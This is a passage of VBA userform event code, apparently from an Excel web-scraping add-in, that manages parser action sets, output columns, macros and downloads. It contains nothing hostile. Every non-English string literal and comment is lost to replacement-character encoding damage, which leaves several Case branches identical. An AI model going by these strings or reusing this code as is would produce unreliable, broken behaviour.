    '    Set Me.ActiveActionSet = Me.ActiveParser.AASets.GetItemByIndex(Me.ListBox_ActionSets.ListIndex + 1)
    '    Me.Frame_SelectedActionSet.Visible = Me.ListBox_ActionSets.ListIndex >= 0
    '    Me.Load_ActiveActionSet_Values
End Sub


Private Sub ListBox_ActionSets_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next
    If Me.ListBox_ActionSets.ListIndex >= 0 Then Me.ActiveActionSet.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd|"
End Sub

Private Sub ListBox_ActionSets_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then
        CreatePopupMenu_ActionSets Me.ActiveActionSet
        If POPUP_MENU_RESULT <> "" Then ActiveActionSet_ExecuteCommand POPUP_MENU_RESULT
    End If
End Sub

Private Sub ListBox_OutputColumns_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next
    Me.ActiveColumn.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(Me.ActiveColumn.Column) _
        & IIf(Me.ActiveColumn.Name <> "", " |fffd|" & Me.ActiveColumn.Name & "|fffd|", "")
End Sub

Private Sub ListBox_OutputColumns_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then
        CreatePopupMenu_ColumnList Me.ActiveColumn
        If POPUP_MENU_RESULT <> "" Then ActiveColumn_ExecuteCommand POPUP_MENU_RESULT
    End If
End Sub

Private Sub ListBox_Resources_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Set Me.ActiveParser.Options.ResourceFileList = New Dictionary
    Dim RFname$, i&
    For i = 0 To Me.ListBox_Resources.ListCount - 1
        RFname$ = Me.ListBox_Resources.list(i, 0)
        If Me.ListBox_Resources.Selected(i) Then Me.ActiveParser.Options.ResourceFileList.Add CStr(RFname$), CStr(RFname$)
    Next i
    
    'Set Me.ActiveParser.AASets.ResourceItems = New Dictionary ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    Me.ActiveParser.Resources.Initialize
    
    Fill_ActionSets_Values
End Sub

Private Sub MultiPage_SelectedColumn_Change()
    On Error Resume Next
    If Me.MultiPage_SelectedColumn.value = Me.MultiPage_SelectedColumn.Pages("Page_OC_HyperlinkAndFormat").Index Then Me.RefreshVariablesListDropdowns
End Sub

Private Sub MultiPage_SelectedDownload_Change()
    Me.RefreshVariablesListDropdowns
End Sub

Private Sub MultiPage_WP_Change()
    On Error Resume Next
    If Me.MultiPage_WP.value = Me.MultiPage_WP.Pages("Page_Downloads").Index Then
        Me.RefreshVariablesListDropdowns
    End If
End Sub


Private Sub TextBox_ActionSet_Name_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveActionSet.Name = Trim(Me.TextBox_ActionSet_Name)
    Me.TextBox_ActionSet_Name.BackColor = vbWindowBackground
    
    Select Case Me.ActiveActionSet.Name
        Case ACTION_SET_NAME_ONSTART$, ACTION_SET_NAME_BEFORESTART$, ACTION_SET_NAME_ONFINISH$
            Me.TextBox_ActionSet_Name.BackColor = &HFFC0FF
        Case ACTION_SET_NAME_BEFORE_SI$, ACTION_SET_NAME_AFTER_SI$, ACTION_SET_NAME_AFTER_LAST_LEVEL$
            Me.TextBox_ActionSet_Name.BackColor = vbYellow
        Case ACTION_SET_NAME_ONCAPTCHA$, ACTION_SET_NAME_MORE_PROXY$, ACTION_SET_NAME_ON_PROXY_CHANGED$
            Me.TextBox_ActionSet_Name.BackColor = vbGreen
    End Select
    Me.Fill_ActionSets_Values
    If Me.ActiveActionSetID <> "" Then Me.Load_ActiveActionSet_Values
End Sub


Private Sub ListBox_Macros_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    Set Me.ActiveMacro = Nothing
    Set ActiveMacro = Me.ActiveParser.Macros.GetItemByIndex(Me.ListBox_Macros.ListIndex + 1)
    Me.Frame_SelectedMacro.Visible = Me.ListBox_Macros.ListIndex >= 0
    Me.Load_ActiveMacro_Values
    
    Me.CommandButton_DeleteMacro.Enabled = Me.ListBox_Macros.ListIndex >= 0
    Me.CommandButton_InsertMacroIntoWorkbook.Enabled = Me.ListBox_Macros.ListIndex >= 0
    Me.CommandButton_CloneMacro.Enabled = Me.ListBox_Macros.ListIndex >= 0
    
    Me.CommandButton_DeleteMacro.Caption = Me.CommandButton_DeleteMacro.Tag & " " & Me.ActiveMacro.Index
End Sub

Private Sub CommandButton_AddMacro_Click()
    On Error Resume Next
    Dim ind&
    ind& = Me.ActiveParser.Macros.Add.Index
    Fill_Macros_Values
    Me.ListBox_Macros.ListIndex = ind& - 1
    Me.ListBox_Macros.SetFocus
End Sub

Private Sub CommandButton_CloneMacro_Click()
    On Error Resume Next
    With Me.ActiveMacro.Parent
        With .Add
            .LoadFromXML ActiveMacro.ExportToXML
        End With
        .UpdateIndexes
    End With
    Me.Fill_Macros_Values
    Me.ListBox_Macros.ListIndex = Me.ListBox_Macros.ListCount - 1
End Sub

Private Sub CommandButton_DeleteMacro_Click()
    On Error Resume Next
    Me.ActiveParser.Macros.DeleteItem Me.ActiveMacro.Index
    Set Me.ActiveMacro = Nothing
    Me.Fill_Macros_Values
    Me.ListBox_Macros.ListIndex = Me.ListBox_Macros.ListCount - 1
    Me.ListBox_Macros.SetFocus
    
    Set Me.ActiveMacro = Me.ActiveParser.Macros.GetItemByIndex(Me.ListBox_Macros.ListIndex + 1)
    Me.Frame_SelectedMacro.Visible = Me.ListBox_Macros.ListIndex >= 0
    Me.Load_ActiveMacro_Values
End Sub





Private Sub CheckBox_OC_Enabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Enabled = Me.CheckBox_OC_Enabled
    Me.RefreshOutputColumnList
End Sub

Private Sub CheckBox_PD_Enabled_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.Enabled = Me.CheckBox_PD_Enabled
    Me.Fill_Downloads_Values
End Sub

'Private Sub CheckBox_WP_Hidden_Click()
'    On Error Resume Next: Me.ActiveParser.Hidden = Me.CheckBox_WP_Hidden
'End Sub

Private Sub CheckBox_WP_EnableDownloads_Click()
    On Error Resume Next: Dim res As Boolean: res = Me.CheckBox_WP_EnableDownloads
    Me.ActiveParser.Downloads.Enabled = res
    Me.MultiPage_WP.Pages("Page_Downloads").Visible = res
    Me.CheckBox_WP_EnableDownloads.Font.Bold = res
End Sub

Private Sub CheckBox_WP_EnableOutputColumns_Click()
    On Error Resume Next: Dim res As Boolean: res = Me.CheckBox_WP_EnableOutputColumns
    Me.ActiveParser.Columns.Enabled = res
    Me.MultiPage_WP.Pages("Page_OutputColumns").Visible = res
    Me.CheckBox_WP_EnableOutputColumns.Font.Bold = res
End Sub


Private Sub ComboBox_AdditionalCommands_Change()
    Me.CommandButton_ExecuteAdditionalCommand.Enabled = Len(Me.ComboBox_AdditionalCommands) > 0
End Sub

Private Sub ComboBox_OC_ColumnNumber_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Column = Val(Me.ComboBox_OC_ColumnNumber)
    Me.Fill_OutputColumns_Values
End Sub

Private Sub ComboBox_SourceData_ColumnNumber_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_Column = Val(Me.ComboBox_SourceData_ColumnNumber)
End Sub

Private Sub ComboBox_SourceData_FirstRow_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_FirstRow = Val(Me.ComboBox_SourceData_FirstRow)
End Sub


Private Sub CommandButton_AddColumn_Click()
    On Error Resume Next
    Dim ind&: ind& = Me.ActiveParser.Columns.Add.Index
    Fill_OutputColumns_Values
    Me.ListBox_OutputColumns.ListIndex = ind& - 1
    Me.ListBox_OutputColumns.SetFocus
End Sub

Private Sub CommandButton_AddColumn_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next
    Dim ind&, ind_before&, iter&
    If Button = 2 Then
        ind& = Me.ActiveParser.Columns.Add(False).Index
        Fill_OutputColumns_Values
        Me.ListBox_OutputColumns.ListIndex = ind& - 1
        Me.ListBox_OutputColumns.SetFocus
    End If
    If Button = 4 Then
        ind_before& = Me.ActiveColumn.Index
        ind& = Me.ActiveParser.Columns.Add.Index
        Fill_OutputColumns_Values
        Me.ListBox_OutputColumns.ListIndex = ind& - 1
        Me.ListBox_OutputColumns.SetFocus
        
        While (ActiveColumn.Index > ind_before&) And (iter& < 200)
            iter& = iter& + 1: CommandButton_ColumnMoveUp_Click
        Wend
    End If
End Sub

Private Sub CommandButton_CloneColumn_Click()
    On Error Resume Next
    With Me.ActiveColumn.Parent
        With .Add
            .LoadFromXML ActiveColumn.ExportToXML
            .Column = .GetNextFreeColumnNumber
        End With
        .UpdateIndexes
    End With
    Me.Fill_OutputColumns_Values
    Me.ListBox_OutputColumns.ListIndex = Me.ListBox_OutputColumns.ListCount - 1
End Sub

Private Sub CommandButton_CloneColumn_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next
    If Button = 2 Then
        With Me.ActiveColumn.Parent
            With .Add
                .LoadFromXML ActiveColumn.ExportToXML
                .Column = .GetNextFreeColumnNumber(False)
            End With
            .UpdateIndexes
        End With
        Me.Fill_OutputColumns_Values
        Me.ListBox_OutputColumns.ListIndex = Me.ListBox_OutputColumns.ListCount - 1
    End If
End Sub

Sub ActiveColumn_ExecuteCommand(ByVal cmd$)
    On Error Resume Next
    'Debug.Print cmd$
    If Me.ActiveColumn Is Nothing Then Exit Sub
    
    Dim parameters, CommandOption$, v1, v2&, MoveDirection As XlDirection
    parameters = Split(cmd$, "\\\")
    CommandOption$ = parameters(2)
    
    If parameters(1) = "current" Then
        Select Case parameters(0)
            Case "export"
                If Me.ActiveColumn.ExportToResourceFile(CommandOption$) Then
                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveColumn.Name & "|fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Information
                Else
                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveColumn.Name & "|fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
                End If
                
            Case "move"
                v1 = Split(CommandOption$, "|")(0)
                v2 = Val(Split(CommandOption$, "|")(1))
                If v1 = "up" Then MoveDirection = xlUp
                If v1 = "down" Then MoveDirection = xlDown
                ' Debug.Print "v1=" & v1, "MoveDirection=" & MoveDirection
                If (MoveDirection <> 0) And (v2 > 0) Then ActiveColumn_Move MoveDirection, v2
        End Select
    End If
End Sub

Sub ActiveActionSet_ExecuteCommand(ByVal cmd$)
    On Error Resume Next
    'Debug.Print cmd$
    If Me.ActiveActionSet Is Nothing Then Exit Sub
    
    Dim parameters, CommandOption$, v1, v2&, MoveDirection As XlDirection
    parameters = Split(cmd$, "\\\")
    CommandOption$ = parameters(2)
    
    If parameters(1) = "current" Then
        Select Case parameters(0)
            Case "export"
                If Me.ActiveActionSet.ExportToResourceFile(CommandOption$) Then
                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Information
                    
                    'Set Me.ActiveParser.AASets.ResourceItems = New Dictionary ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    Me.ActiveParser.Resources.Initialize
                    
                    Fill_ActionSets_Values
                Else
                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ActiveActionSet.Name & "|fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Warning
                End If
                
            Case "move"
                v1 = Split(CommandOption$, "|")(0)
                v2 = Val(Split(CommandOption$, "|")(1))
                If v1 = "up" Then MoveDirection = xlUp
                If v1 = "down" Then MoveDirection = xlDown
                ' Debug.Print "v1=" & v1, "MoveDirection=" & MoveDirection
                If (MoveDirection <> 0) And (v2 > 0) Then ActiveActionSet_Move MoveDirection, v2
        End Select
    End If
End Sub

Sub CommandButton_ColumnMoveDown_Click()
    ActiveColumn_Move xlDown, 1
End Sub
Sub CommandButton_ColumnMoveUp_Click()
    ActiveColumn_Move xlUp, 1
End Sub
Private Sub CommandButton_ColumnMoveDown_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ActiveColumn_Move xlDown, 2: Me.Fill_OutputColumns_Values
    If Button = 4 Then ActiveColumn_Move xlDown, 3
End Sub
Private Sub CommandButton_ColumnMoveUp_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ActiveColumn_Move xlUp, 2: Me.Fill_OutputColumns_Values
    If Button = 4 Then ActiveColumn_Move xlUp, 3
End Sub

Sub ActiveColumn_Move(ByVal Direction As XlDirection, ByVal Mode&)
    ' Mode& = 1 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) / 2 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|) / 3 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)
    On Error Resume Next
    Dim iter&, OC As OutputColumn
    
    Select Case Mode&
        
        Case 1 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Select Case Direction
                Case xlDown
                    Set ActiveColumn = ActiveColumn.MoveDown
                    Me.Fill_OutputColumns_Values
                    If ActiveColumn.Index - Me.ListBox_OutputColumns.TopIndex > 7 Then Me.ListBox_OutputColumns.TopIndex = Me.ListBox_OutputColumns.TopIndex + 1
                Case xlUp
                    Set ActiveColumn = ActiveColumn.MoveUp
                    Me.Fill_OutputColumns_Values
                    If Me.ListBox_OutputColumns.TopIndex - ActiveColumn.Index > -4 Then Me.ListBox_OutputColumns.TopIndex = Me.ListBox_OutputColumns.TopIndex - 1
            End Select
            Me.ListBox_OutputColumns.SetFocus
            
        Case 2 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|
            Select Case Direction
                Case xlDown
                    While (ActiveColumn.Index < ActiveColumn.Parent.Items.Count) And (iter& < 200)
                        iter& = iter& + 1: CommandButton_ColumnMoveDown_Click
                    Wend
                Case xlUp
                    While (ActiveColumn.Index > 1) And (iter& < 200)
                        iter& = iter& + 1: CommandButton_ColumnMoveUp_Click
                    Wend
            End Select
            
        Case 3 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            Select Case Direction
                Case xlDown
                    For Each OC In Me.ActiveColumn.Parent.Items
                        If OC.Index >= ActiveColumn.Index Then OC.Column = OC.Column + 1
                    Next
                    
                Case xlUp
                    If ActiveColumn.Column > 1 Then
                        For Each OC In Me.ActiveColumn.Parent.Items
                            If OC.Index >= ActiveColumn.Index Then OC.Column = OC.Column - 1
                        Next
                    End If
            End Select
            Me.Fill_OutputColumns_Values
            
    End Select
    'Debug.Print IIf(Direction = xlUp, "up", IIf(Direction = xlDown, "down", "???")) & ", mode=" & Mode&, iter&
End Sub


' ------------------------------------

'Sub CommandButton_ActionSetMoveDown_Click()
'    ActiveColumn_Move xlDown, 1
'End Sub
'Sub CommandButton_ActionSetMoveUp_Click()
'    ActiveActionSet_Move xlUp, 1
'End Sub
'Private Sub CommandButton_ActionSetMoveDown_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    If Button = 2 Then ActiveActionSet_Move xlDown, 2: Me.Fill_ActionSets_Values
'    If Button = 4 Then ActiveActionSet_Move xlDown, 3
'End Sub
'Private Sub CommandButton_ActionSetMoveUp_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    If Button = 2 Then ActiveActionSet_Move xlUp, 2: Me.Fill_ActionSets_Values
'    If Button = 4 Then ActiveActionSet_Move xlUp, 3
'End Sub

Sub ActiveActionSet_Move(ByVal Direction As XlDirection, ByVal Mode&)
    ' Mode& = 1 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) / 2 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|) / 3 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)
    On Error Resume Next
    Dim iter&
    
    Select Case Mode&
        
        Case 1 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Select Case Direction
                Case xlDown
                    Set ActiveActionSet = ActiveActionSet.MoveDown
                    Me.Fill_ActionSets_Values
                    If ActiveActionSet.Index - Me.ListBox_ActionSets.TopIndex > 7 Then Me.ListBox_ActionSets.TopIndex = Me.ListBox_ActionSets.TopIndex + 1
                Case xlUp
                    Set ActiveActionSet = ActiveActionSet.MoveUp
                    Me.Fill_ActionSets_Values
                    If Me.ListBox_ActionSets.TopIndex - ActiveActionSet.Index > -4 Then Me.ListBox_ActionSets.TopIndex = Me.ListBox_ActionSets.TopIndex - 1
            End Select
            Me.ListBox_ActionSets.SetFocus
            
        Case 2 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|
            Select Case Direction
                Case xlDown
                    While (ActiveActionSet.Index < ActiveActionSet.ParentSets.Items.Count) And (iter& < 200)
                        iter& = iter& + 1: ActiveActionSet_Move xlDown, 1
                    Wend
                Case xlUp
                    While (ActiveActionSet.Index > 1) And (iter& < 200)
                        iter& = iter& + 1: ActiveActionSet_Move xlUp, 1
                    Wend
            End Select
            
    End Select
    'Debug.Print IIf(Direction = xlUp, "up", IIf(Direction = xlDown, "down", "???")) & ", mode=" & Mode&, iter&
End Sub

' ------------------------------------


Sub CommandButton_DeleteColumn_Click()
    On Error Resume Next
    Dim ind&: ind& = Me.ActiveColumn.Index
    Me.ActiveParser.Columns.DeleteItem Me.ActiveColumn.Index
    Set Me.ActiveColumn = Nothing
    Me.Fill_OutputColumns_Values
    If ind& <= Me.ListBox_OutputColumns.ListCount Then
        Me.ListBox_OutputColumns.ListIndex = ind& - 1
    Else
        Me.ListBox_OutputColumns.ListIndex = Me.ListBox_OutputColumns.ListCount - 1
    End If
    Me.ListBox_OutputColumns.SetFocus
    
    Set Me.ActiveColumn = Me.ActiveParser.Columns.GetItemByIndex(Me.ListBox_OutputColumns.ListIndex + 1)
    Me.Frame_SelectedColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.MultiPage_SelectedColumn.Visible = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.Load_ActiveColumn_Values
End Sub

Private Sub CommandButton_DownloadSaveOptions_SelectFolder_Click()
    On Error Resume Next
    Dim OldFolderPath$, InitialFolder$, NewFolder$
    OldFolderPath$ = Me.ActiveDownload.GetDownloadFolderPath(False)
    InitialFolder$ = IIf(FolderExists(OldFolderPath$), OldFolderPath$, ThisWorkbook.Path & "\")
    NewFolder$ = FWF.GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", InitialFolder$)
    If NewFolder$ = "" Then Exit Sub
    Me.TextBox_DownloadSaveOptions_Folder = Replace(NewFolder$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
End Sub


Sub CommandButton_EditActions_Main_Click()
    On Error Resume Next: Me.ActiveParser.SourceData.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True
    If JumpToNextLevel Then
        JumpToNextLevel = False
        FP_ArrayActions_Edit.TextBox_TestSource = NextLevelSourceValue
    End If
End Sub

Sub CommandButton_EditActions_OC_Click()
    On Error Resume Next: Me.ActiveColumn.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(Me.ActiveColumn.Column) _
        & IIf(Me.ActiveColumn.Name <> "", " |fffd|" & Me.ActiveColumn.Name & "|fffd|", ""), _
        ActiveColumn.Index < ActiveColumn.Parent.Items.Count, True
    If JumpToNextLevel Then
        JumpToNextLevel = False
    End If
End Sub

Private Sub CommandButton_EditActions_OCs_Click()
    On Error Resume Next: Me.ActiveParser.Columns.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Sub

Private Sub CommandButton_EditActions_PD_Click()
    On Error Resume Next: Me.ActiveDownload.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.ActiveDownload.Index _
        & IIf(Me.ActiveDownload.Name <> "", " |fffd|" & Me.ActiveDownload.Name & "|fffd|", "")
End Sub

Private Sub CommandButton_EditActions_PDs_Click()
    On Error Resume Next: Me.ActiveParser.Downloads.Actions.Edit Me, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Sub

Private Sub CommandButton_ExecuteAdditionalCommand_Click()
    On Error Resume Next
    Select Case Me.ComboBox_AdditionalCommands
        
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Dim WP As WebsiteParser: Set WP = Me.ActiveParser.Clone
            If WP Is Nothing Then Exit Sub
            If WP.Name = "close form" Then
                Unload Me
                Exit Sub
            End If
            WP.Save
            WP.Activate
            RunWithDelay "EditActiveParser", 0.6        ' Restart_EditParser_Userform
            Unload Me
            
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            CommandButton_RenameParser_Click
            
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Me.ActiveParser.Delete
            Set Me.ActiveParser = Nothing
            UpdateAddinToolbar
            Unload Me
            
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            If Me.ActiveParser.ReadyToPublish Then
                Set F_Publish.WP = Me.ActiveParser
                F_Publish.Show
            End If
            
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| Excel"
            If Me.ActiveParser.Locked Then
                MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
            Else
                Me.ActiveParser.AttachToSheet ActiveSheet
            End If
            
    End Select
End Sub

'Sub CommandButton_UploadConfigAs_Click()
'    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'    NewName$ = Trim(InputBox(msg, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", ActiveConfig.Name))
'    If NewName$ = "" Then Exit Sub
'    If Not Developer Then NewName$ = Mid(HID, 2) & " " & NewName$
'    'If Developer Then NewName$ = Mid(HID, 2) & " " & NewName$
'
'    ActiveConfig.Upload NewName$
'End Sub


Private Sub CommandButton_EditActionsList_URL_Click()
    On Error Resume Next
    'Me.ActiveParser.URL.Actions.Edit Me
End Sub

Sub CommandButton_RenameParser_Click()
    On Error Resume Next
    Me.ActiveParser.Rename
    Me.FillActiveParserValues
    UpdateAddinToolbar
End Sub

Private Sub CommandButton_SaveAndCloseParser_Click()
    On Error Resume Next
    Me.ActiveParser.Save
    Unload Me
End Sub

Private Sub CommandButton_SaveAndCloseParser_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next: If Button = 2 Then Me.ActiveParser.Save
End Sub

Private Sub Label__DownloadSaveOptions_OpenFolder_Click()
    On Error Resume Next: Dim DownloadFolderPath$
    DownloadFolderPath$ = Me.ActiveDownload.GetDownloadFolderPath(True)
    FWF.OpenFolder DownloadFolderPath$
End Sub

Private Sub Label_OC_Name_Click()
    On Error Resume Next
    Dim col&, txt$
    col = Val(Me.ComboBox_OC_ColumnNumber)
    If col Then
        txt$ = Trim(ActiveSheet.Cells(Val(Me.ComboBox_SheetHeaderRow), col))
        If Len(txt) Then Me.TextBox_OC_ColumnName = txt
    End If
End Sub


Private Sub ListBox_Downloads_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    Set Me.ActiveDownload = Nothing
    Set ActiveDownload = Me.ActiveParser.Downloads.GetItemByIndex(Me.ListBox_Downloads.ListIndex + 1)
    Me.MultiPage_SelectedDownload.Visible = Me.ListBox_Downloads.ListIndex >= 0
    Me.Frame_SelectedDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.Load_ActiveDownload_Values
    
    Me.CommandButton_DeleteDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_DownloadMoveUp.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_DownloadMoveDown.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_CloneDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    
    Me.CommandButton_DeleteDownload.Caption = Me.CommandButton_DeleteDownload.Tag & " " & Me.ActiveDownload.Index
End Sub

Private Sub CommandButton_AddDownload_Click()
    On Error Resume Next
    Dim ind&
    ind& = Me.ActiveParser.Downloads.Add.Index
    Fill_Downloads_Values
    Me.ListBox_Downloads.ListIndex = ind& - 1
    Me.ListBox_Downloads.SetFocus
End Sub

Private Sub CommandButton_CloneDownload_Click()
    On Error Resume Next
    With Me.ActiveDownload.Parent
        With .Add
            .LoadFromXML ActiveDownload.ExportToXML
        End With
        .UpdateIndexes
    End With
    Me.Fill_Downloads_Values
    Me.ListBox_Downloads.ListIndex = Me.ListBox_Downloads.ListCount - 1
End Sub

Private Sub CommandButton_DownloadMoveDown_Click()
    On Error Resume Next
    Set ActiveDownload = ActiveDownload.MoveDown
    Me.Fill_Downloads_Values
    Me.ListBox_Downloads.SetFocus
End Sub

Private Sub CommandButton_DownloadMoveUp_Click()
    On Error Resume Next
    Set ActiveDownload = ActiveDownload.MoveUp
    Me.Fill_Downloads_Values
